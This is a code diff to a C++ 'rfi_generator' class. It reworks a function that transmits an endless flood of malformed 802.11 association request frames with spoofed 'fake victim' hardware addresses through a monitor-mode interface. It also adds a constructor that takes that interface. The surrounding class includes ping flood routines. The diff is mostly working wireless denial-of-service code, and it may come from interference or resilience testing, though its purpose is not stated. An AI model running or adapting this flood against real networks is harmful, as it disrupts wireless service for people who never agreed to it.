@@ -19,6 +19,12 @@ rfi_generator::rfi_generator(const std::string &iface, const std::string &ip_add
     }
 }
 
+
+rfi_generator::rfi_generator(const std::string &mon_iface)
+{
+    this->interface = mon_iface;
+}
+
 void rfi_generator::send_ping(int num_packets, int packet_size, int interval)
 {
     std::random_device rd;
@@ -92,8 +98,8 @@ void rfi_generator::start_ping_flood_duration(int packet_size, int duration, int
 
 }
 
-void rfi_generator::send_malformed_association_request_flood(const std::string &monitor_interface,
-                                                             const std::string &fake_source_ip,
+void rfi_generator::send_malformed_association_request_flood(const std::string &fake_victim1_hw_address,
+                                                             const std::string &fake_victim2_hw_address,
                                                              int interval)
 {
     /**
@@ -108,22 +114,22 @@ void rfi_generator::send_malformed_association_request_flood(const std::string &
      *      interface = "wlx00c0caa55b49"
      *      send_ping(interface, number_of_packets_to_send=1000, size_of_packet=1024)
      */
-    pcpp::MacAddress fake_source_hw_address;
     Tins::RadioTap radio_tap;
     Tins::Dot11AssocRequest dot11;
     Tins::PacketSender sender;
 
-    this->analyzer->get_hw_address(fake_source_ip, fake_source_hw_address);
+    //this->analyzer->get_hw_address(fake_source_ip, fake_source_hw_address);
 
-    dot11.addr1(fake_source_hw_address.toString());
-    dot11.addr2(this->target_hw_address);
-    dot11.addr3(this->target_hw_address);
+    dot11.addr1(fake_victim1_hw_address);
+    dot11.addr2(fake_victim2_hw_address);
+    dot11.addr3(fake_victim2_hw_address);
 
     while (true)
     {
         radio_tap.inner_pdu(dot11);
-        sender.send(radio_tap, monitor_interface);
+        sender.send(radio_tap, this->interface);
         if (interval > 0)
             std::this_thread::sleep_for(std::chrono::milliseconds(interval));
     }
 }
+
